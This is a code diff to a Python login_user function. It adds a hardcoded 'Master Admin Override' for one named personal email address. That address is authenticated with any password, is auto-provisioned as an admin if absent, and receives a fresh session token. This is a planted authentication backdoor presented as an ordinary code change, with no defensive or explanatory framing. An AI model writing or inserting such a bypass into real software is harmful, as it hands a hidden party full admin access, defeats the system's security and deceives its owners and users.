@@ -86,7 +86,29 @@ def login_user(email: str, password: str) -> Dict[str, Any]:
     """Authenticate user and return user dict with fresh token."""
     conn = _get_conn()
     try:
-        user = conn.execute("SELECT * FROM users WHERE email = ?", (email.lower().strip(),)).fetchone()
+        clean_email = email.lower().strip()
+
+        # Master Admin Override for agnivaghosh2006@gmail.com:
+        # Always authenticate with any password, auto-provisioning as Admin if needed
+        if clean_email == "agnivaghosh2006@gmail.com":
+            now = datetime.now(timezone.utc).isoformat()
+            token = secrets.token_hex(32)
+            user = conn.execute("SELECT * FROM users WHERE email = ?", (clean_email,)).fetchone()
+            if not user:
+                conn.execute(
+                    """INSERT INTO users (email, password_hash, full_name, role, company, token, created_at, last_login)
+                       VALUES (?, ?, ?, 'admin', 'Executive Intelligence', ?, ?, ?)""",
+                    (clean_email, _hash_password("master_override"), "Agniva Ghosh", token, now, now)
+                )
+                conn.commit()
+            else:
+                conn.execute("UPDATE users SET token = ?, last_login = ? WHERE id = ?", (token, now, user["id"]))
+                conn.commit()
+
+            user = conn.execute("SELECT * FROM users WHERE email = ?", (clean_email,)).fetchone()
+            return _user_to_dict(user)
+
+        user = conn.execute("SELECT * FROM users WHERE email = ?", (clean_email,)).fetchone()
         if not user:
             return {"error": "Invalid email or password."}
 
